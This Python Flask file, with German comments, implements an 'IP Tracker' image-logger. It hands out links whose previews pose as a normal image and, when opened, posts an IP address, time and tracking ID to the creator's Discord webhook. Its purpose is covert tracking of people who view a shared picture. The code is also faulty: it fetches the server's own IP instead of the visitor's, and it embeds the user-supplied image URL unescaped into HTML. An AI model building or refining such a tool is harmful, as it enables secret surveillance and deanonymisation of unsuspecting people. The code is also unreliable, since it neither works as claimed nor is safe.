from flask import Flask, request, jsonify, send_from_directory
import os
import json
import secrets
from datetime import datetime
import urllib.request
import base64

app = Flask(__name__)

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/upload', methods=['POST'])
def upload_image():
    try:
        data = request.get_json()
        image_url = data.get('image_url', '').strip()
        webhook_url = data.get('webhook', '').strip()
        
        if not image_url:
            return jsonify({'error': 'Bild-URL ist erforderlich'}), 400
        
        if not webhook_url:
            return jsonify({'error': 'Webhook URL ist erforderlich'}), 400
        
        # Generiere einzigartige Tracking-ID
        tracking_id = secrets.token_urlsafe(16)
        
        # Erstelle Tracking-Daten
        tracking_data = {
            'id': tracking_id,
            'image_url': image_url,
            'webhook_url': webhook_url,
            'created_at': datetime.now().isoformat()
        }
        
        # Kodiere Tracking-Daten als base64 für die URL
        tracking_data_encoded = base64.b64encode(json.dumps(tracking_data).encode()).decode()
        
        # Generiere Tracking-URL mit eingebetteten Daten
        protocol = 'https://'
        host = request.host
        tracking_url = f"{protocol}{host}/track?data={tracking_data_encoded}"
        
        return jsonify({
            'success': True,
            'tracking_id': tracking_id,
            'tracking_url': tracking_url
        })
        
    except Exception as e:
        return jsonify({'error': f'Server-Fehler: {str(e)}'}), 500

@app.route('/track')
def track_image():
    # Hole die base64-kodierten Daten aus der URL
    tracking_data_encoded = request.args.get('data')
    
    if not tracking_data_encoded:
        return "Tracking-Daten fehlen", 400
    
    try:
        # Dekodiere die Tracking-Daten
        tracking_data = json.loads(base64.b64decode(tracking_data_encoded).decode())
        
        # Hole IP-Adresse von myip.com
        real_ip = "Unbekannt"
        try:
            ip_response = urllib.request.urlopen('https://api.myip.com', timeout=5)
            real_ip = ip_response.read().decode().strip()
        except:
            try:
                ip_response = urllib.request.urlopen('https://ipinfo.io/json', timeout=5)
                ip_data = json.loads(ip_response.read().decode())
                real_ip = ip_data.get('ip', 'Unbekannt')
            except:
                pass
        
        # Sende Discord-Benachrichtigung
        try:
            webhook_url = tracking_data['webhook_url']
            send_discord_notification(webhook_url, real_ip, tracking_data['id'])
        except Exception as e:
            print(f"Discord Fehler: {e}")
        
        # Zeige Tracking-Seite mit echtem Bild
        image_url = tracking_data['image_url']
        
        return f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="Tracking Bild">
    <meta property="og:description" content="Jemand hat dein Bild angesehen">
    <meta property="og:image" content="{image_url}">
    <meta property="og:image:width" content="800">
    <meta property="og:image:height" content="600">
    <meta property="og:url" content="{request.url}">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="IP Tracker">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Tracking Bild">
    <meta name="twitter:description" content="Jemand hat dein Bild angesehen">
    <meta name="twitter:image" content="{image_url}">
    <style>
        body {{ 
            margin: 0; 
            padding: 0; 
            background: #000; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
        }}
        .container {{
            text-align: center;
            max-width: 100%;
        }}
        img {{ 
            max-width: 100%; 
            height: auto; 
            max-height: 90vh;
            object-fit: contain;
        }}
        .loading {{
            color: white;
            font-family: Arial, sans-serif;
            font-size: 18px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="loading">Bild wird geladen...</div>
        <img src="{image_url}" alt="Tracking Bild" onload="document.querySelector('.loading').style.display='none'">
    </div>
</body>
</html>
        """
        
    except Exception as e:
        return f"Fehler: {str(e)}", 500

def send_discord_notification(webhook_url, ip_address, tracking_id):
    """Sendet eine Benachrichtigung an Discord"""
    try:
        embed = {
            "title": "🔍 Bild wurde angesehen!",
            "description": f"Jemand hat dein Tracking-Bild angesehen",
            "color": 5814783,  # Blau
            "fields": [
                {
                    "name": "🌐 IP-Adresse",
                    "value": f"```\n{ip_address}\n```",
                    "inline": True
                },
                {
                    "name": "🕐 Uhrzeit",
                    "value": f"```\n{datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n```",
                    "inline": True
                },
                {
                    "name": "🔗 Tracking-ID",
                    "value": f"```\n{tracking_id}\n```",
                    "inline": False
                }
            ],
            "footer": {
                "text": "IP Tracker - Automatische Benachrichtigung"
            },
            "timestamp": datetime.now().isoformat()
        }
        
        data = {
            "embeds": [embed]
        }
        
        req = urllib.request.Request(
            webhook_url,
            data=json.dumps(data).encode('utf-8'),
            headers={'Content-Type': 'application/json'}
        )
        
        with urllib.request.urlopen(req) as response:
            return response.read().decode()
            
    except Exception as e:
        print(f"Fehler beim Senden an Discord: {e}")
        return str(e)

@app.route('/health')
def health_check():
    return jsonify({'status': 'healthy', 'timestamp': datetime.now().isoformat()})

# Vercel Handler
def handler(request):
    return app(request)

if __name__ == '__main__':
    app.run(debug=True)
